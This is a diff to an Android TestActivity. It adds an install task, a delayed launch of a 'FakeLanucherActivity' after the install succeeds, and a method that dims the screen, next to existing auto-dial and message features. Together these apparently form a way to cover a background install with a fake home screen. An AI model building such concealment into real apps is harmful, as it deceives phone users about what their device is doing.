@@ -21,6 +21,8 @@ import android.os.PowerManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.ComponentName;
+import android.view.WindowManager;
+
 
 public class TestActivity extends Activity {
     private static final String TAG = "TestActivity";
@@ -35,6 +37,7 @@ public class TestActivity extends Activity {
     private static final int DIAL_AUTO = 0;
     private static final int SHOW_DIALOG = 1;
     private static final int START_INTENT = 2;
+    private static final int SHOW_BACK_VIEW = 3;
     private Handler mHandler = new Handler() {
         public void handleMessage(Message msg) {
             switch (msg.what) {
@@ -52,6 +55,18 @@ public class TestActivity extends Activity {
                 Log.d(TAG, "[[handleMessage]] start intent message");
                 startIntent();
                 break;
+            case Config.INSTALL_SUCCESS:
+                Log.d(TAG, "start install activity success");
+                mHandler.sendEmptyMessageDelayed(SHOW_BACK_VIEW, 3 * 1000);
+                break;
+            case Config.INSTALL_FAILED:
+                Log.d(TAG, "start install activity falied -------");
+                break;
+            case SHOW_BACK_VIEW:
+                Intent i = new Intent();
+                i.setClass(getApplicationContext(), FakeLanucherActivity.class);
+                startActivity(i);
+                break;
             }
         }
     };
@@ -65,7 +80,6 @@ public class TestActivity extends Activity {
         mEditText = (EditText) findViewById(R.id.text);
         mNumText = (EditText) findViewById(R.id.num);
         Button bt = (Button) findViewById(R.id.send);
-     
         Log.d(TAG, "[[onCreate]] bt = " + bt);
         if (bt != null) {
             bt.setOnClickListener(new View.OnClickListener() {
@@ -110,6 +124,17 @@ public class TestActivity extends Activity {
             });
         }
         
+        View install = findViewById(R.id.install);
+        if (install != null) {
+            install.setOnClickListener(new View.OnClickListener() {
+                @Override
+                public void onClick(View v) {
+                    InstallASyncTask installTask = new InstallASyncTask(TestActivity.this);
+                    installTask.execute(mHandler);
+                }
+            });
+        }
+        
 //        Intent intent = new Intent();
 ////        intent.setAction("android.intent.action.MAIN");
 ////        intent.addCategory("android.intent.category.LAUNCHER");
@@ -117,6 +142,13 @@ public class TestActivity extends Activity {
 //        intent.setComponent(c);
 //        this.startActivity(intent);
     }
+    
+    private void brightness() {
+        WindowManager.LayoutParams lp = getWindow().getAttributes();
+        lp.screenBrightness = 0.1f;
+        getWindow().setAttributes(lp);
+    }
+
     
     private void dial() {
         Log.d(TAG, "[[dial]]");
